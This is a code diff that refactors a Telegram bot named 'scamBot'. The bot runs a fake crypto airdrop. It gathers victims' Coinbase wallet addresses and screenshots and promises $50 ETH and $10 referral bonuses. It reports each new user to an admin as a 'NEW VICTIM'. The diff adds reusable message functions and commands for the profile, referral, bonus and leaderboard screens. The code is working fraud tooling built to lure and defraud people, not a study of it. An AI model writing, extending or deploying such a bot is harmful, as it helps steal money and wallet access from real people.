@@ -36,7 +36,7 @@ Add this network to Coinbase Wallet:
 **Currency:** ETH
 `.trim();
 
-// === SEND TO ADMIN (FIXED: FULLY ASYNC) ===
+// === SEND TO ADMIN (FIXED) ===
 const sendToAdmin = async (text, photoFileId = null, postLink = null) => {
   try {
     let caption = text;
@@ -87,6 +87,65 @@ const menuKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback('Leaderboard', 'menu_leaderboard')]
 ]);
 
+// === REUSABLE MESSAGES ===
+const generateProfile = async (id) => {
+  const user = getUser(id);
+  return `*PROFILE*\n\n` +
+    `User: @${user.username}\n` +
+    `Wallet: \`${user.wallet}\`\n` +
+    `Earned: $${user.totalEarned}\n` +
+    `Referrals: ${user.referrals.length}\n` +
+    `Link: ${escapeLink(user.referralCode)}`;
+};
+
+const generateReferral = async (id) => {
+  const user = getUser(id);
+  return `*REFERRAL LINK*\n\nEarn $10 per referral:\n${escapeLink(user.referralCode)}\n\nYou have ${user.referrals.length} referrals.`;
+};
+
+const generateBonus = async (id) => {
+  const user = getUser(id);
+  const bonus = user.referrals.length * 10;
+  return `*YOUR BONUS*\n\n` +
+    `Referrals: ${user.referrals.length}\n` +
+    `Total: $${bonus}\n\n` +
+    `Click to withdraw:`;
+};
+
+const generateLeaderboard = async () => {
+  const top = Object.values(usersDB).sort((a, b) => b.totalEarned - a.totalEarned).slice(0, 10);
+  let text = `*LEADERBOARD*\n\n`;
+  if (top.length === 0) text += 'No entries yet.';
+  top.forEach((u, i) => text += `${i + 1}. @${u.username} — $${u.totalEarned} (${u.referrals.length} refs)\n`);
+  return text;
+};
+
+// === COMMANDS (SYNC WITH MENU) ===
+scamBot.command('profile', async (ctx) => {
+  const user = getUser(ctx.from.id);
+  if (!user) return ctx.reply('Use /start first.');
+  ctx.reply(await generateProfile(ctx.from.id), { parse_mode: 'Markdown' });
+});
+
+scamBot.command('referral', async (ctx) => {
+  const user = getUser(ctx.from.id);
+  if (!user) return ctx.reply('Use /start first.');
+  ctx.reply(await generateReferral(ctx.from.id), { parse_mode: 'Markdown' });
+});
+
+scamBot.command('bonus', async (ctx) => {
+  const user = getUser(ctx.from.id);
+  if (!user) return ctx.reply('Use /start.');
+  ctx.reply(await generateBonus(ctx.from.id), {
+    parse_mode: 'Markdown',
+    reply_markup: { inline_keyboard: [[{ text: 'WITHDRAW BONUS', callback_data: 'withdraw_bonus' }]] }
+  });
+});
+
+scamBot.command('leaderboard', async (ctx) => {
+  ctx.reply(await generateLeaderboard(), { parse_mode: 'Markdown' });
+});
+
 // === /start — SMART MENU OR FLOW ===
 scamBot.start(async (ctx) => {
   let user = getUser(ctx.from.id);
@@ -125,7 +184,7 @@ scamBot.start(async (ctx) => {
     await sendToAdmin(`*NEW VICTIM*\nUser: @${user.username}\nID: \`${user.telegramId}\`\nRef: \`${code}\``);
     ctx.reply(`Send your *Coinbase wallet address* (text) + *screenshot* (photo).`, Markup.inlineKeyboard([[Markup.button.callback('Send Wallet + SS', 'send_wallet')]]));
   } else if (user.claimed50) {
-    ctx.reply(`*Welcome back, @${user.username}!*\nYou already claimed $50 ETH.`, menuKeyboard);
+    ctx.reply(`*Welcome back, @${user.username}!*\nYou claimed $50 ETH.`, menuKeyboard);
   } else {
     ctx.reply(`Continue your airdrop:\nStage: ${user.stage}`, Markup.inlineKeyboard([[Markup.button.callback('Resume', 'send_wallet')]]));
   }
@@ -257,67 +316,28 @@ scamBot.action('claim_eth', async (ctx) => {
   ctx.reply(`*Welcome to your dashboard!*`, menuKeyboard);
 });
 
-// === MENU ACTIONS ===
-scamBot.action('menu_profile', (ctx) => {
-  const user = getUser(ctx.from.id);
-  ctx.editMessageText(
-    `*PROFILE*\n\n` +
-    `User: @${user.username}\n` +
-    `Wallet: \`${user.wallet}\`\n` +
-    `Earned: $${user.totalEarned}\n` +
-    `Referrals: ${user.referrals.length}\n` +
-    `Link: ${escapeLink(user.referralCode)}`,
-    { parse_mode: 'Markdown' }
-  );
+// === MENU ACTIONS (SYNC WITH COMMANDS) ===
+scamBot.action('menu_profile', async (ctx) => {
+  await ctx.answerCbQuery();
+  ctx.reply(await generateProfile(ctx.from.id), { parse_mode: 'Markdown' });
 });
 
-scamBot.action('menu_referral', (ctx) => {
-  const user = getUser(ctx.from.id);
-  ctx.editMessageText(
-    `*REFERRAL LINK*\n\nEarn $10 per referral:\n${escapeLink(user.referralCode)}\n\nYou have ${user.referrals.length} referrals.`,
-    { parse_mode: 'Markdown' }
-  );
+scamBot.action('menu_referral', async (ctx) => {
+  await ctx.answerCbQuery();
+  ctx.reply(await generateReferral(ctx.from.id), { parse_mode: 'Markdown' });
 });
 
-scamBot.action('menu_bonus', (ctx) => {
-  const user = getUser(ctx.from.id);
-  const bonus = user.referrals.length * 10;
-  ctx.editMessageText(
-    `*YOUR BONUS*\n\n` +
-    `Referrals: ${user.referrals.length}\n` +
-    `Bonus: $${bonus}\n\n` +
-    `Click to withdraw:`,
-    { 
-      parse_mode: 'Markdown',
-      reply_markup: { 
-        inline_keyboard: [[{ text: 'WITHDRAW BONUS', callback_data: 'withdraw_bonus' }]] 
-      }
-    }
-  );
+scamBot.action('menu_bonus', async (ctx) => {
+  await ctx.answerCbQuery();
+  ctx.reply(await generateBonus(ctx.from.id), {
+    parse_mode: 'Markdown',
+    reply_markup: { inline_keyboard: [[{ text: 'WITHDRAW BONUS', callback_data: 'withdraw_bonus' }]] }
+  });
 });
 
-scamBot.action('menu_leaderboard', (ctx) => {
-  const top = Object.values(usersDB).sort((a, b) => b.totalEarned - a.totalEarned).slice(0, 10);
-  let text = `*LEADERBOARD*\n\n`;
-  top.forEach((u, i) => text += `${i + 1}. @${u.username} — $${u.totalEarned} (${u.referrals.length} refs)\n`);
-  ctx.editMessageText(text, { parse_mode: 'Markdown' });
-});
-
-// === /bonus COMMAND ===
-scamBot.command('bonus', (ctx) => {
-  const user = getUser(ctx.from.id);
-  if (!user) return ctx.reply('Use /start.');
-  const bonus = user.referrals.length * 10;
-  ctx.reply(
-    `*YOUR BONUS*\n\n` +
-    `Referrals: ${user.referrals.length}\n` +
-    `Total: $${bonus}\n\n` +
-    `Click to withdraw:`,
-    { 
-      parse_mode: 'Markdown',
-      reply_markup: { inline_keyboard: [[{ text: 'WITHDRAW BONUS', callback_data: 'withdraw_bonus' }]] }
-    }
-  );
+scamBot.action('menu_leaderboard', async (ctx) => {
+  await ctx.answerCbQuery();
+  ctx.reply(await generateLeaderboard(), { parse_mode: 'Markdown' });
 });
 
 scamBot.action('withdraw_bonus', async (ctx) => {
